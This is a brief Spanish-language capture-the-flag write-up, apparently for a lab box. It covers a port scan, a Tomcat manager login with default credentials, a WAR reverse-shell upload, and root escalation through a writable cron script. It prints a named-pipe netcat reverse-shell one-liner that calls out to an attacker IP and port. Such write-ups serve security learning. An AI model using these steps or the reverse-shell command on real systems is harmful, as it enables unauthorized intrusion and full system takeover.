
# SCAN
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
8080/tcp open  http    Apache Tomcat 8.5.5
```
En el puerto 8080 hay un servidor ***apache tomcat***. Se trata de un servidor que utiliza como lenguaje de programacion java. En concreto utiliza la clase 
servlet que lo que hace es implementar una especie de applets que se ejecutan en el servidor en lugar de en el navegador y es la respuesta de java a otros 
lenguajes del servidor como php o node.js

# EXPLOTACION
Cuando entramos en la pagina se nos muestra por defecto la pagina por defecto del servidor tomcat que tiene un boton "manager app". Si apretamos el boton 
nos sale un formulario de autenticacion. ¿Que metemos aqui?. Pues parece ser que por defecto los servidores tomcat se configuran para autentificarse
con las credenciales por defecto (vaya bobada!!!) que son tomcat:s3cret.
Asi lo hago y entro en la pagina del manager. Aqui hay un boton que nos permite subir archivos .war (son como jar pero para utilizarlos en la web). Puedo 
construir un payload con msfvenom con la extension .war (lo hago con rs-gen). Subo el archivo y lo ejecuto (deploy) y tengo un shell con el usuario tomcat

# USER.TXT
Esta en el home del usuario jack y tenemos permiso de lectura (otra bobada)

# ROOT.TXT
Hay una tarea programada en /etc/crontab que ejecuta root que consiste en un script id.sh. Este script se puede reescribir. Lo rescribo con un 
payload:
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.11.62.57 4455 >/tmp/f
y obtengo un reversed shell con root
